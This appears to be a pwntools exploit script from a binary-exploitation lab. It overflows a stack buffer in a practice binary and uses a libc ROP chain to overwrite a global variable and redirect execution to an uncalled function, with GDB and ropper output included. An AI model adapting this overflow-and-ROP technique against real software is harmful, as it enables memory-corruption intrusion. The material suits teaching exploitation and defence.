#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x80484e6: file src/08-overwrite-global.c, line 8.
(gdb) c
Continuing.
Reading /lib/i386-linux-gnu/libc.so.6 from remote target...
Reading /lib/i386-linux-gnu/libc-2.27.so from remote target...
Reading /lib/i386-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/08-overwrite-global.c:8
8	int vulnerable() {
(gdb) i r $esp
esp            0xffffcf6c	0xffffcf6c
(gdb) p &buffer[0]
$1 = 0xffffcee0 ""
(gdb) info proc mappings 
process 7075
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
...
	0xf7dd1000 0xf7fa6000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa6000 0xf7fa7000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa7000 0xf7fa9000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fa9000 0xf7faa000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
...
"""

"""
$ ropper --nocolor --file /lib/i386-linux-gnu/libc-2.27.so
0x00024b5e: pop eax; ret;
0x001926d5: pop ecx; ret;
0x0002c05e: mov dword ptr [eax], ecx; ret; 
"""

import struct
import sys

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './bin/x86/08-overwrite-global'

vulnerable_ret_addr = 0xffffcf6c
buffer_addr = 0xffffcee0
libc_addr = 0xf7dd1000

pop_eax_ret_addr = libc_addr + 0x00024b5e
pop_ecx_ret_addr = libc_addr + 0x001926d5
mov_dword_ptr_eax_ecx_ret_addr = libc_addr + 0x0002c05e

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p32(pop_eax_ret_addr)
payload += p32(x_addr)
payload += p32(pop_ecx_ret_addr)
payload += p32(0xbeefc0de)
payload += p32(mov_dword_ptr_eax_ecx_ret_addr)
payload += p32(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
